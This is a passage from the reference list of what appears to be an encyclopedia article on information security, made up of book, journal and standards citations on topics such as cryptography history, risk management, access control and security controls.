ISSN
 
1472-6696
. 
S2CID
 
144325193
.




^
 
Young, Courtenay (May 8, 2018), 
"Working with panic attacks"
, 
Help Yourself Towards Mental Health
, Routledge, pp. 209–214, 
doi
:
10.4324/9780429475474-32
, 
ISBN
 
978-0-429-47547-4
, retrieved 
May 28,
 2021




^
 
"Introduction: Inside the Insider Threat"
, 
Insider Threats
, Cornell University Press, pp. 1–9, December 31, 2017, 
doi
:
10.7591/9781501705946-003
, 
ISBN
 
978-1-5017-0594-6
, retrieved 
May 28,
 2021




^
 
Lequiller, F.; Blades, D. (2014). 
Table 7.7 France: Comparison of the profit shares of non-financial corporations and non-financial corporations plus unincorporated enterprises
 
(PDF)
. 
OECD
. p. 217. 
doi
:
10.1787/9789264214637-en
. 
ISBN
 
978-92-64-21462-0
. Retrieved 
December 1,
 2023
.




^
 
"How Did it All Come About?", 
The Compliance Business and Its Customers
, Basingstoke: Palgrave Macmillan, 2012, 
doi
:
10.1057/9781137271150.0007
, 
ISBN
 
978-1-137-27115-0




^
 
Gordon, Lawrence A.
; 
Loeb, Martin P.
 (November 2002). 
"The Economics of Information Security Investment"
. 
ACM Transactions on Information and System Security
. 
5
 (4): 438–457. 
doi
:
10.1145/581271.581274
. 
S2CID
 
1500788
.




^
 
Cho Kim, Byung; Khansa, Lara; James, Tabitha (July 2011). 
"Individual Trust and Consumer Risk Perception"
. 
Journal of Information Privacy and Security
. 
7
 (3): 3–22. 
doi
:
10.1080/15536548.2011.10855915
. 
ISSN
 
1553-6548
. 
S2CID
 
144643691
.




^
 
Stewart, James (2012). 
CISSP Certified Information Systems Security Professional Study Guide Sixth Edition
. Canada: John Wiley & Sons, Inc. pp. 255–257. 
ISBN
 
978-1-118-31417-3
.




^
 
Gillett, John (March 1994). 
"The cost-benefit of outsourcing: assessing the true cost of your outsourcing strategy"
. 
European Journal of Purchasing & Supply Management
. 
1
 (1): 45–47. 
doi
:
10.1016/0969-7012(94)90042-6
. 
ISSN
 
0969-7012
.




^
 
Larsen, Daniel (October 31, 2019). 
"Creating An American Culture Of Secrecy: Cryptography In Wilson-Era Diplomacy"
. 
Diplomatic History
. 
doi
:
10.1093/dh/dhz046
. 
ISSN
 
0145-2096
.




^
 
"Introduction : Caesar Is Dead. Long Live Caesar!"
, 
Julius Caesar's Self-Created Image and Its Dramatic Afterlife
, Bloomsbury Academic, 2018, 
doi
:
10.5040/9781474245784.0005
, 
ISBN
 
978-1-4742-4578-4
, retrieved 
May 29,
 2021




^
 
Suetonius Tranquillus, Gaius
 (2008). 
Lives of the Caesars (Oxford World's Classics)
. New York: Oxford University Press. p. 28. 
ISBN
 
978-0-19-953756-3
.




^
 
Singh, Simon
 (2000). 
The Code Book
. Anchor. pp. 
289–290
. 
ISBN
 
978-0-385-49532-5
.




^
 
Tan, Heng Chuan (2017). 
Towards trusted and secure communications in a vehicular environment
 (Thesis). Nanyang Technological University. 
doi
:
10.32657/10356/72758
.




^
 
Johnson, John (1997). 
The Evolution of British Sigint: 1653–1939
. Her Majesty's Stationery Office. 
ASIN
 
B00GYX1GX2
.




^
 
Willison, M. (September 21, 2018). 
"Were Banks Special? Contrasting Viewpoints in Mid-Nineteenth Century Britain"
. 
Monetary Economics: International Financial Flows
. 
doi
:
10.2139/ssrn.3249510
. Retrieved 
December 1,
 2023
.




^
 
Ruppert, K. (2011). 
"Official Secrets Act (1889; New 1911; Amended 1920, 1939, 1989)"
. In Hastedt, G.P. (ed.). 
Spies, Wiretaps, and Secret Operations: An Encyclopedia of American Espionage
. Vol. 2. ABC-CLIO. pp. 589–590. 
ISBN
 
9781851098088
.




^
 
"2. The Clayton Act: A consideration of section 2, defining unlawful price discrimination"
. 
The Federal Anti-Trust Law
. Columbia University Press. December 31, 1930. pp. 18–28. 
doi
:
10.7312/dunn93452-003
. 
ISBN
 
978-0-231-89377-0
. Retrieved 
May 29,
 2021
.




^
 
Maer, Lucinda; Gay (December 30, 2008). 
"Official Secrecy"
 
(PDF)
. 
Federation of American Scientists
.




^
 
"The Official Secrets Act 1989 which replaced section 2 of the 1911 Act", 
Espionage and Secrecy (Routledge Revivals)
, Routledge, pp. 267–282, June 10, 2016, 
doi
:
10.4324/9781315542515-21
 (inactive September 11, 2024), 
ISBN
 
978-1-315-54251-5
{{
citation
}}
:  CS1 maint: DOI inactive as of September 2024 (
link
)




^
 
"Official Secrets Act: what it covers; when it has been used, questioned"
. 
The Indian Express
. March 8, 2019
. Retrieved 
August 7,
 2020
.




^
 
Singh, Gajendra (November 2015). 
"
"Breaking the Chains with Which We were Bound": The Interrogation Chamber, the Indian National Army and the Negation of Military Identities, 1941–1947"
. 
Brill's Digital Library of World War I
. 
doi
:
10.1163/2352-3786_dlws1_b9789004211452_019
. Retrieved 
May 28,
 2021
.




^
 
Duncanson, Dennis (June 1982). 
"The scramble to unscramble French Indochina"
. 
Asian Affairs
. 
13
 (2): 161–170. 
doi
:
10.1080/03068378208730070
. 
ISSN
 
0306-8374
.




^
 
Whitman et al. 2017
, pp. 3.




^
 
"Allied Power. Mobilizing Hydro-Electricity During Canada'S Second World War"
, 
Allied Power
, University of Toronto Press, pp. 1–2, December 31, 2015, 
doi
:
10.3138/9781442617117-003
, 
ISBN
 
978-1-4426-1711-7
, retrieved 
May 29,
 2021




^
 
Glatthaar, Joseph T. (June 15, 2011), 
"Officers and Enlisted Men"
, 
Soldiering in the Army of Northern Virginia
, University of North Carolina Press, pp. 83–96, 
doi
:
10.5149/9780807877869_glatthaar.11
, 
ISBN
 
978-0-8078-3492-3
, retrieved 
May 28,
 2021




^ 
a
 
b
 
Sebag–Montefiore, H. (2011). 
Enigma: The Battle for the Code
. Orion. p. 576. 
ISBN
 
9781780221236
.




^
 
Whitman et al. 2017
, pp. 4–5.




^ 
a
 
b
 
Whitman et al. 2017
, p. 5.




^
 
Dekar, Paul R. (April 26, 2012). 
Thomas Merton: Twentieth-Century Wisdom for Twenty-First-Century Living
. The Lutterworth Press. pp. 160–184. 
doi
:
10.2307/j.ctt1cg4k28.13
. 
ISBN
 
978-0-7188-4069-3
. Retrieved 
May 29,
 2021
.




^
 
Murphy, Richard C. (September 1, 2009). 
Building more powerful less expensive supercomputers using Processing-In-Memory (PIM) LDRD final report
 (Report). 
doi
:
10.2172/993898
.




^
 
"A Brief History of the Internet"
. 
www.usg.edu
. Retrieved 
August 7,
 2020
.




^
 
"Walking through the view of Delft - on Internet"
. 
Computers & Graphics
. 
25
 (5): 927. October 2001. 
doi
:
10.1016/s0097-8493(01)00149-2
. 
ISSN
 
0097-8493
.




^
 
DeNardis, L. (2007). "Chapter 24: A History of Internet Security". In de Leeuw, K.M.M.; Bergstra, J. (eds.). 
The History of Information Security: A Comprehensive Handbook
. Elsevier. pp. 
681
–704. 
ISBN
 
9780080550589
.




^
 
Parrish, Allen; Impagliazzo, John; Raj, Rajendra K.; Santos, Henrique; Asghar, Muhammad Rizwan; Jøsang, Audun; Pereira, Teresa; Stavrou, Eliana (July 2, 2018). 
"Global perspectives on cybersecurity education for 2030: A case for a meta-discipline"
. 
Proceedings Companion of the 23rd Annual ACM Conference on Innovation and Technology in Computer Science Education
. ACM. pp. 36–54. 
doi
:
10.1145/3293881.3295778
. 
hdl
:
1822/71620
. 
ISBN
 
978-1-4503-6223-8
. 
S2CID
 
58004425
.




^
 
Perrin, Chad (June 30, 2008). 
"The CIA Triad"
. Retrieved 
May 31,
 2012
.




^
 
Sandhu, Ravi; Jajodia, Sushil (October 20, 2000), "Relational Database Security", 
Information Security Management Handbook, Four Volume Set
, Auerbach Publications, 
doi
:
10.1201/9780203325438.ch120
, 
ISBN
 
978-0-8493-1068-3




^ 
a
 
b
 
Stoneburner, G.; Hayden, C.; Feringa, A. (2004). 
"Engineering Principles for Information Technology Security"
 
(PDF)
. csrc.nist.gov. 
doi
:
10.6028/NIST.SP.800-27rA
. Archived from 
the original
 
(PDF)
 on August 15, 2011
. Retrieved 
August 28,
 2011
.




^
 
A. J. Neumann, N. Statland and R. D. Webb (1977). 
"Post-processing audit tools and techniques"
 
(PDF)
. US Department of Commerce, National Bureau of Standards. pp. 11-3--11-4.




^
 
"oecd.org"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on May 16, 2011
. Retrieved 
January 17,
 2014
.




^
 
"GSSP (Generally-Accepted system Security Principles): A trip to abilene"
. 
Computers & Security
. 
15
 (5): 417. January 1996. 
doi
:
10.1016/0167-4048(96)82630-7
. 
ISSN
 
0167-4048
.




^
 
Slade, Rob. 
"(ICS)2 Blog"
. Archived from 
the original
 on November 17, 2017
. Retrieved 
November 17,
 2017
.




^
 
Aceituno, Vicente. 
"Open Information Security Maturity Model"
. Retrieved 
February 12,
 2017
.




^
 
"George Cybenko – George Cybenko's Personal Home Page"
 
(PDF)
. Archived from 
the original
 
(PDF)
 on March 29, 2018
. Retrieved 
January 5,
 2018
.




^
 
Hughes, Jeff; 
Cybenko, George
 (June 21, 2018). 
"Quantitative Metrics and Risk Assessment: The Three Tenets Model of Cybersecurity"
. 
Technology Innovation Management Review
. 
3
 (8).




^
 
Teplow, Lily (July 2020). 
"Are Your Clients Falling for These IT Security Myths? [CHART]"
. 
continuum.net
.




^
 
Beckers, K. (2015). 
Pattern and Security Requirements: Engineering-Based Establishment of Security Standards
. Springer. p. 100. 
ISBN
 
9783319166643
.




^
 
Fienberg, Stephen E.; Slavković, Aleksandra B. (2011), "Data Privacy and Confidentiality", 
International Encyclopedia of Statistical Science
, pp. 342–345, 
doi
:
10.1007/978-3-642-04898-2_202
, 
ISBN
 
978-3-642-04897-5




^ 
a
 
b
 
c
 
d
 
e
 
Andress, J. (2014). 
The Basics of Information Security: Understanding the Fundamentals of InfoSec in Theory and Practice
. Syngress. p. 240. 
ISBN
 
9780128008126
.




^
 
Boritz, J. Efrim (2005). "IS Practitioners' Views on Core Concepts of Information Integrity". 
International Journal of Accounting Information Systems
. 
6
 (4). Elsevier: 260–279. 
doi
:
10.1016/j.accinf.2005.07.001
.




^
 
Hryshko, I. (2020). 
"Unauthorized Occupation of Land and Unauthorized Construction: Concepts and Types of Tactical Means of Investigation"
. 
International Humanitarian University Herald. Jurisprudence
 (43): 180–184. 
doi
:
10.32841/2307-1745.2020.43.40
. 
ISSN
 
2307-1745
.




^
 
Kim, Bonn-Oh (September 21, 2000), 
"Referential Integrity for Database Design"
, 
High-Performance Web Databases
, Auerbach Publications, pp. 427–434, 
doi
:
10.1201/9781420031560-34
, 
ISBN
 
978-0-429-11600-1
, retrieved 
May 29,
 2021




^
 
Pevnev, V. (2018). 
"Model Threats and Ensure the Integrity of Information"
. 
Systems and Technologies
. 
2
 (56): 80–95. 
doi
:
10.32836/2521-6643-2018.2-56.6
. 
ISSN
 
2521-6643
.




^
 
Fan, Lejun; Wang, Yuanzhuo; Cheng, Xueqi; Li, Jinming; Jin, Shuyuan (February 26, 2013). 
"Privacy theft malware multi-process collaboration analysis"
. 
Security and Communication Networks
. 
8
 (1): 51–67. 
doi
:
10.1002/sec.705
. 
ISSN
 
1939-0114
.




^
 
"Completeness, Consistency, and Integrity of the Data Model"
. 
Measuring Data Quality for Ongoing Improvement
. MK Series on Business Intelligence. Elsevier. 2013. pp. e11–e19. 
doi
:
10.1016/b978-0-12-397033-6.00030-4
. 
ISBN
 
978-0-12-397033-6
. Retrieved 
May 29,
 2021
.




^
 
Video from SPIE - the International Society for Optics and Photonics
. 
doi
:
10.1117/12.2266326.5459349132001
. Retrieved 
May 29,
 2021
.




^
 
"Communication Skills Used by Information Systems Graduates"
. 
Issues in Information Systems
. 2005. 
doi
:
10.48009/1_iis_2005_311-317
. 
ISSN
 
1529-7314
.




^
 
Outages of electric power supply resulting from cable failures Boston Edison Company system
 (Report). July 1, 1980. 
doi
:
10.2172/5083196
. 
OSTI
 
5083196
. Retrieved 
January 18,
 2022
.




^
 
Loukas, G.; Oke, G. (September 2010) [August 2009]. 
"Protection Against Denial of Service Attacks: A Survey"
 
(PDF)
. 
Comput. J.
 
53
 (7): 1020–1037. 
doi
:
10.1093/comjnl/bxp078
. Archived from 
the original
 
(PDF)
 on March 24, 2012
. Retrieved 
August 28,
 2015
.




^
 
"Be Able To Perform a Clinical Activity"
, 
Definitions
, Qeios, February 2, 2020, 
doi
:
10.32388/dine5x
, 
S2CID
 
241238722
, retrieved 
May 29,
 2021




^
 
Ohta, Mai; Fujii, Takeo (May 2011). 
"Iterative cooperative sensing on shared primary spectrum for improving sensing ability"
. 
2011 IEEE International Symposium on Dynamic Spectrum Access Networks (DySPAN)
. IEEE. pp. 623–627. 
doi
:
10.1109/dyspan.2011.5936257
. 
ISBN
 
978-1-4577-0177-1
. 
S2CID
 
15119653
.




^
 
Information technology. Information security incident management
, BSI British Standards, 
doi
:
10.3403/30387743
, retrieved 
May 29,
 2021




^
 
Blum, Dan (2020), 
"Identify and Align Security-Related Roles"
, 
Rational Cybersecurity for Business
, Berkeley, CA: Apress, pp. 31–60, 
doi
:
10.1007/978-1-4842-5952-8_2
, 
ISBN
 
978-1-4842-5951-1
, 
S2CID
 
226626983
, retrieved 
May 29,
 2021




^
 
McCarthy, C. (2006). 
"Digital Libraries: Security and Preservation Considerations"
. In Bidgoli, H. (ed.). 
Handbook of Information Security, Threats, Vulnerabilities, Prevention, Detection, and Management
. Vol. 3. John Wiley & Sons. pp. 49–76. 
ISBN
 
9780470051214
.




^
 
Information technology. Open systems interconnection. Security frameworks for open systems
, BSI British Standards, 
doi
:
10.3403/01110206u
, retrieved 
May 29,
 2021




^
 
Christofori, Ralf (January 1, 2014), "Thus could it have been", 
Julio Rondo - O.k., Meta Memory
, Wilhelm Fink Verlag, 
doi
:
10.30965/9783846757673_003
 (inactive August 12, 2024), 
ISBN
 
978-3-7705-5767-7
{{
citation
}}
:  CS1 maint: DOI inactive as of August 2024 (
link
)




^
 
Atkins, D. (May 2021). 
"Use of the Walnut Digital Signature Algorithm with CBOR Object Signing and Encryption (COSE)"
. 
RFC Editor
. 
doi
:
10.17487/rfc9021
. 
S2CID
 
182252627
. Retrieved 
January 18,
 2022
.




^
 
Le May, I. (2003), 
"Structural Integrity in the Petrochemical Industry"
, 
Comprehensive Structural Integrity
, Elsevier, pp. 125–149, 
doi
:
10.1016/b0-08-043749-4/01001-6
, 
ISBN
 
978-0-08-043749-1
, retrieved 
May 29,
 2021




^
 
Sodjahin, Amos; Champagne, Claudia; Coggins, Frank; Gillet, Roland (January 11, 2017). 
"Leading or lagging indicators of risk? The informational content of extra-financial performance scores"
. 
Journal of Asset Management
. 
18
 (5): 347–370. 
doi
:
10.1057/s41260-016-0039-y
. 
ISSN
 
1470-8272
. 
S2CID
 
157485290
.




^
 
Reynolds, E H (July 22, 1995). 
"Folate has potential to cause harm"
. 
BMJ
. 
311
 (6999): 257. 
doi
:
10.1136/bmj.311.6999.257
. 
ISSN
 
0959-8138
. 
PMC
 
2550299
. 
PMID
 
7503870
.




^
 
Randall, Alan (2011), 
"Harm, risk, and threat"
, 
Risk and Precaution
, Cambridge: Cambridge University Press, pp. 31–42, 
doi
:
10.1017/cbo9780511974557.003
, 
ISBN
 
978-0-511-97455-7
, retrieved 
May 29,
 2021




^
 
Grama, J.L. (2014). 
Legal Issues in Information Security
. Jones & Bartlett Learning. p. 550. 
ISBN
 
9781284151046
.




^
 
Cannon, David L. (March 4, 2016). 
"Audit Process"
. 
CISA: Certified Information Systems Auditor Study Guide
 (Fourth ed.). pp. 139–214. 
doi
:
10.1002/9781119419211.ch3
. 
ISBN
 
9781119056249
.




^
 
CISA Review Manual 2006
. Information Systems Audit and Control Association. 2006. p. 85. 
ISBN
 
978-1-933284-15-6
.




^
 
Kadlec, Jaroslav (November 2, 2012). 
"Two-dimensional process modeling (2DPM)"
. 
Business Process Management Journal
. 
18
 (6): 849–875. 
doi
:
10.1108/14637151211283320
. 
ISSN
 
1463-7154
.




^
 
"All Countermeasures Have Some Value, But No Countermeasure Is Perfect"
, 
Beyond Fear
, New York: Springer-Verlag, pp. 207–232, 2003, 
doi
:
10.1007/0-387-21712-6_14
, 
ISBN
 
0-387-02620-7
, retrieved 
May 29,
 2021




^
 
"Data breaches: Deloitte suffers serious hit while more details emerge about Equifax and Yahoo"
. 
Computer Fraud & Security
. 
2017
 (10): 1–3. October 2017. 
doi
:
10.1016/s1361-3723(17)30086-6
. 
ISSN
 
1361-3723
.




^
 
Spagnoletti, Paolo; Resca A. (2008). 
"The duality of Information Security Management: fighting against predictable and unpredictable threats"
. 
Journal of Information System Security
. 
4
 (3): 46–62.




^
 
Yusoff, Nor Hashim; Yusof, Mohd Radzuan (August 4, 2009). 
"Managing HSE Risk in Harsh Environment"
. 
All Days
. SPE. 
doi
:
10.2118/122545-ms
.




^
 
Baxter, Wesley (2010). 
Sold out: how Ottawa's downtown business improvement areas have secured and valorized urban space
 (Thesis). Carleton University. 
doi
:
10.22215/etd/2010-09016
.




^
 
de Souza, André; Lynch, Anthony (June 2012). 
"Does Mutual Fund Performance Vary over the Business Cycle?"
. Cambridge, MA. 
doi
:
10.3386/w18137
. 
S2CID
 
262620435
.




^
 
Kiountouzis, E.A.; Kokolakis, S.A. (May 31, 1996). 
Information systems security: facing the information society of the 21st century
. London: Chapman & Hall, Ltd. 
ISBN
 
978-0-412-78120-9
.




^
 
Newsome, B. (2013). 
A Practical Introduction to Security and Risk Management
. SAGE Publications. p. 208. 
ISBN
 
9781483324852
.




^ 
a
 
b
 
Whitman, M.E.; Mattord, H.J. (2016). 
Management of Information Security
 (5th ed.). Cengage Learning. p. 592. 
ISBN
 
9781305501256
.




^
 
"Hardware, Fabrics, Adhesives, and Other Theatrical Supplies"
, 
Illustrated Theatre Production Guide
, Routledge, pp. 203–232, March 20, 2013, 
doi
:
10.4324/9780080958392-20
, 
ISBN
 
978-0-08-095839-2
, retrieved 
May 29,
 2021




^
 
Reason, James (March 2, 2017), 
"Perceptions of Unsafe Acts"
, 
The Human Contribution
, CRC Press, pp. 69–103, 
doi
:
10.1201/9781315239125-7
, 
ISBN
 
978-1-315-23912-5
, retrieved 
May 29,
 2021




^
 
"Information Security Procedures and Standards"
, 
Information Security Policies, Procedures, and Standards
, Boca Raton, FL: Auerbach Publications, pp. 81–92, March 27, 2017, 
doi
:
10.1201/9781315372785-5
, 
ISBN
 
978-1-315-37278-5
, retrieved 
May 29,
 2021




^
 
Zhuang, Haifeng; Chen, Yu; Sheng, Xianfu; Hong, Lili; Gao, Ruilan; Zhuang, Xiaofen (June 25, 2020). 
"Figure S1: Analysis of the prognostic impact of each single signature gene"
. 
PeerJ
. 
8
: e9437. 
doi
:
10.7717/peerj.9437/supp-1
.




^
 
Standaert, B.; Ethgen, O.; Emerson, R.A. (June 2012). 
"CO4 Cost-Effectiveness Analysis - Appropriate for All Situations?"
. 
Value in Health
. 
15
 (4): A2. 
doi
:
10.1016/j.jval.2012.03.015
. 
ISSN
 
1098-3015
.




^
 
"GRP canopies provide cost-effective over-door protection"
. 
Reinforced Plastics
. 
40
 (11): 8. November 1996. 
doi
:
10.1016/s0034-3617(96)91328-4
. 
ISSN
 
0034-3617
.




^
 
"Figure 2.3. Relative risk of being a low performer depending on personal circumstances (2012)"
. 
doi
:
10.1787/888933171410
. Retrieved 
May 29,
 2021
.




^
 
Stoneburner, Gary; Goguen, Alice; Feringa, Alexis (2002). 
"NIST SP 800-30 Risk Management Guide for Information Technology Systems"
. 
doi
:
10.6028/NIST.SP.800-30
. Retrieved 
January 18,
 2022
.




^
 
"May I Choose? Can I Choose? Oppression and Choice", 
A Theory of Freedom
, Palgrave Macmillan, 2012, 
doi
:
10.1057/9781137295026.0007
, 
ISBN
 
978-1-137-29502-6




^
 
Parker, Donn B. (January 1994). 
"A Guide to Selecting and Implementing Security Controls"
. 
Information Systems Security
. 
3
 (2): 75–86. 
doi
:
10.1080/10658989409342459
. 
ISSN
 
1065-898X
.




^
 
Zoccali, Carmine; Mallamaci, Francesca; Tripepi, Giovanni (September 25, 2007). 
"Guest Editor: Rajiv Agarwal: Cardiovascular Risk Profile Assessment and Medication Control Should Come First"
. 
Seminars in Dialysis
. 
20
 (5): 405–408. 
doi
:
10.1111/j.1525-139x.2007.00317.x
. 
ISSN
 
0894-0959
. 
PMID
 
17897245
. 
S2CID
 
33256127
.




^
 
Guide to the Implementation and Auditing of ISMS Controls based on ISO/IEC 27001
. London: BSI British Standards. November 1, 2013. 
doi
:
10.3403/9780580829109
. 
ISBN
 
978-0-580-82910-9
.




^
 
Johnson, L. (2015). 
Security Controls Evaluation, Testing, and Assessment Handbook
. Syngress. p. 678. 
ISBN
 
9780128025642
.




^
 
Information technology. Security techniques. Mapping the revised editions of ISO/IEC 27001 and ISO/IEC 27002
, BSI British Standards, 
doi
:
10.3403/30310928
, retrieved 
May 29,
 2021




^ 
a
 
b
 
c
 
"Administrative Controls"
, 
Occupational Ergonomics
, CRC Press, pp. 443–666, March 26, 2003, 
doi
:
10.1201/9780203507933-6
, 
ISBN
 
978-0-429-21155-3
, retrieved 
May 29,
 2021




^
 
Chen, J.; Demers, E.A.; Lev, B. (June 2013). 
"How Time of Day Impacts on Business Conversations"
. 
doi
:
10.13007/141
. Archived from 
the original
 on December 18, 2022
. Retrieved 
January 18,
 2022
.




^
 
44 U.S.C.
 
§ 3542
(b)(1)




^
 
"Appendix D", 
Information Security Policy Development for Compliance
, Auerbach Publications, pp. 117–136, March 22, 2013, 
doi
:
10.1201/b13922-12
, 
ISBN
 
978-1-4665-8058-9




^
 
"Firewalls, Intrusion Detection Systems and Vulnerability Assessment: A Superior Conjunction?"
. 
Network Security
. 
2002
 (9): 8–11. September 2002. 
doi
:
10.1016/s1353-4858(02)09009-8
. 
ISSN
 
1353-4858
.




^
 
Ransome, J.; Misra, A. (2013). 
Core Software Security: Security at the Source
. CRC Press. pp. 40–41. 
ISBN
 
9781466560956
.




^
 
Weik, Martin H. (2000), "least privilege principle", 
Computer Science and Communications Dictionary
, p. 883, 
doi
:
10.1007/1-4020-0613-6_10052
, 
ISBN
 
978-0-7923-8425-0




^
 
Emir, Astra (September 2018). "19. Duties of Ex-employees". 
Law Trove
. 
doi
:
10.1093/he/9780198814849.003.0019
. 
ISBN
 
978-0-19-185251-0
.




^
 
Guide for Information Access Privileges to Health Information
, ASTM International, 
doi
:
10.1520/e1986-09
, retrieved 
May 29,
 2021




^
 
Drury, Bill (January 1, 2009), 
"Physical environment"
, 
Control Techniques, Drives and Controls Handbook
, Institution of Engineering and Technology, pp. 355–381, 
doi
:
10.1049/pbpo057e_chb3
, 
ISBN
 
978-1-84919-013-8
, retrieved 
May 29,
 2021




^
 
Fire detection and fire alarms systems
, BSI British Standards, 
doi
:
10.3403/30266863
, retrieved 
May 29,
 2021




^
 
Silverman, Arnold B. (November 2001). 
"Employee exit interviews—An important but frequently overlooked procedure"
. 
JOM
. 
53
 (11): 48. 
Bibcode
:
2001JOM....53k..48S
. 
doi
:
10.1007/s11837-001-0195-4
. 
ISSN
 
1047-4838
. 
S2CID
 
137528079
.




^
 
"Many employee pharmacists should be able to benefit"
. 
The Pharmaceutical Journal
. 2013. 
doi
:
10.1211/pj.2013.11124182
. 
ISSN
 
2053-6186
.




^
 
"Segregation of Duties Control matrix"
. ISACA. 2008. Archived from 
the original
 on July 3, 2011
. Retrieved 
September 30,
 2008
.




^
 
"Residents Must Protect Their Private Information"
. 
JAMA
. 
279
 (17): 1410B. May 6, 1998. 
doi
:
10.1001/jama.279.17.1410
. 
ISSN
 
0098-7484
.




^
 
"Group Wisdom Support Systems: Aggregating the Insights of Many Through Information Technology"
. 
Issues in Information Systems
. 2008. 
doi
:
10.48009/2_iis_2008_343-350
. 
ISSN
 
1529-7314
.




^
 
"INTERDEPENDENCIES OF INFORMATION SYSTEMS"
, 
Lessons Learned: Critical Information Infrastructure Protection
, IT Governance Publishing, pp. 34–37, 2018, 
doi
:
10.2307/j.ctt1xhr7hq.13
, 
ISBN
 
978-1-84928-958-0
, retrieved 
May 29,
 2021




^
 
"Managing Network Security"
, 
Network Perimeter Security
, Auerbach Publications, pp. 17–66, October 27, 2003, 
doi
:
10.1201/9780203508046-3
, 
ISBN
 
978-0-429-21157-7
, retrieved 
May 29,
 2021




^
 
Kakareka, A. (2013). 
"Chapter 31: What is Vulnerability Assessment?"
. In Vacca, J.R. (ed.). 
Computer and Information Security Handbook
 (2nd ed.). Elsevier. pp. 541–552. 
ISBN
 
9780123946126
.




^
 
Duke, P. A.; Howard, I. P. (August 17, 2012). 
"Processing vertical size disparities in distinct depth planes"
. 
Journal of Vision
. 
12
 (8): 10. 
doi
:
10.1167/12.8.10
. 
ISSN
 
1534-7362
. 
PMID
 
22904355
.




^
 
"Security Onion Control Scripts"
. 
Applied Network Security Monitoring
. Elsevier. 2014. pp. 451–456. 
doi
:
10.1016/b978-0-12-417208-1.09986-4
. 
ISBN
 
978-0-12-417208-1
. Retrieved 
May 29,
 2021
.




^
 
Saia, Sergio; Fragasso, Mariagiovanna; Vita, Pasquale De; Beleggia, Romina. 
"Metabolomics Provides Valuable Insight for the Study of Durum Wheat: A Review"
. 
Journal of Agricultural and Food Chemistry
. 
doi
:
10.1021/acs.jafc.8b07097.s001
. Retrieved 
May 29,
 2021
.




^
 
"Overview", 
Information Security Policies, Procedures, and Standards
, Auerbach Publications, December 20, 2001, 
doi
:
10.1201/9780849390326.ch1
, 
ISBN
 
978-0-8493-1137-6




^
 
Electrical protection relays. Information and requirements for all protection relays
, BSI British Standards, 
doi
:
10.3403/bs142-1
, retrieved 
May 29,
 2021




^
 
Dibattista, Joseph D.; Reimer, James D.; Stat, Michael; Masucci, Giovanni D.; Biondi, Piera; Brauwer, Maarten De; Bunce, Michael (February 6, 2019). 
"Supplemental Information 4: List of all combined families in alphabetical order assigned in MEGAN vers. 5.11.3"
. 
PeerJ
. 
7
: e6379. 
doi
:
10.7717/peerj.6379/supp-4
.




^
 
Kim, Sung-Won (March 31, 2006). 
"A Quantitative Analysis of Classification Classes and Classified Information Resources of Directory"
. 
Journal of Information Management
. 
37
 (1): 83–103. 
doi
:
10.1633/jim.2006.37.1.083
. 
ISSN
 
0254-3621
.




^ 
a
 
b
 
Bayuk, J. (2009). 
"Chapter 4: Information Classification"
. In Axelrod, C.W.; Bayuk, J.L.; Schutzer, D. (eds.). 
Enterprise Information Security and Privacy
. Artech House. pp. 59–70. 
ISBN
 
9781596931916
.




^
 
"Welcome to the Information Age"
, 
Overload!
, Hoboken, NJ, US: John Wiley & Sons, Inc., pp. 43–65, September 11, 2015, 
doi
:
10.1002/9781119200642.ch5
, 
ISBN
 
978-1-119-20064-2
, retrieved 
May 29,
 2021




^
 
Crooks, S. (2006). 
"102. Case Study: When Exposure Control Efforts Override Other Important Design Considerations"
. 
AIHce 2006
. AIHA. 
doi
:
10.3320/1.2759009
 (inactive September 11, 2024).
{{
cite book
}}
:  CS1 maint: DOI inactive as of September 2024 (
link
)




^
 
"Business Model for Information Security (BMIS)"
. ISACA. Archived from 
the original
 on January 26, 2018
. Retrieved 
January 25,
 2018
.




^
 
McAuliffe, Leo (January 1987). 
"Top secret/trade secret: Accessing and safeguarding restricted information"
. 
Government Information Quarterly
. 
4
 (1): 123–124. 
doi
:
10.1016/0740-624x(87)90068-2
. 
ISSN
 
0740-624X
.




^
 
Iqbal, Javaid; Soroya, Saira Hanif; Mahmood, Khalid (January 5, 2023). 
"Financial information security behavior in online banking"
. 
Information Development
: 026666692211493. 
doi
:
10.1177/02666669221149346
. 
ISSN
 
0266-6669
. 
S2CID
 
255742685
.




^
 
Khairuddin, Ismail Mohd; Sidek, Shahrul Naim; Abdul Majeed, Anwar P.P.; Razman, Mohd Azraai Mohd; Puzi, Asmarani Ahmad; Yusof, Hazlina Md (February 25, 2021). 
"Figure 7: Classification accuracy for each model for all features"
. 
PeerJ Computer Science
. 
7
: e379. 
doi
:
10.7717/peerj-cs.379/fig-7
.




^
 
"Asset Classification"
, 
Information Security Fundamentals
, Auerbach Publications, pp. 327–356, October 16, 2013, 
doi
:
10.1201/b15573-18
, 
ISBN
 
978-0-429-13028-1
, retrieved 
June 1,
 2021




^ 
a
 
b
 
Almehmadi, Abdulaziz; El-Khatib, Khalil (2013). 
"Authorized! Access denied, unauthorized! Access granted"
. 
Proceedings of the 6th International Conference on Security of Information and Networks
. Sin '13. New York, New York, US: ACM Press. pp. 363–367. 
doi
:
10.1145/2523514.2523612
. 
ISBN
 
978-1-4503-2498-4
. 
S2CID
 
17260474
.




^ 
a
 
b
 
Peiss, Kathy (2020), 
"The Country of the Mind Must Also Attack"
, 
Information Hunters
, Oxford University Press, pp. 16–39, 
doi
:
10.1093/oso/9780190944612.003.0003
, 
ISBN
 
978-0-19-094461-2
, retrieved 
June 1,
 2021




^
 
Fugini, M.G.; Martella, G. (January 1988). 
"A petri-net model of access control mechanisms"
. 
Information Systems
. 
13
 (1): 53–63. 
doi
:
10.1016/0306-4379(88)90026-9
. 
ISSN
 
0306-4379
.




^
 
Information technology. Personal identification. ISO-compliant driving licence
, BSI British Standards, 
doi
:
10.3403/30170670u
, retrieved 
June 1,
 2021




^
 
Santos, Omar (2015). 
Ccna security 210-260 official cert guide
. Cisco press. 
ISBN
 
978-1-58720-566-8
. 
OCLC
 
951897116
.




^
 
"What is Assertion?"
, 
ASSERTION TRAINING
, Abingdon, UK: Taylor & Francis, pp. 1–7, 1991, 
doi
:
10.4324/9780203169186_chapter_one
, 
ISBN
 
978-0-203-28556-5
, retrieved 
June 1,
 2021




^
 
Doe, John (1960). 
"Field Season In Illinois Begins May 2"
. 
Soil Horizons
. 
1
 (2): 10. 
doi
:
10.2136/sh1960.2.0010
. 
ISSN
 
2163-2812
.




^
 
Leech, M. (March 1996). 
"Username/Password Authentication for SOCKS V5"
. 
doi
:
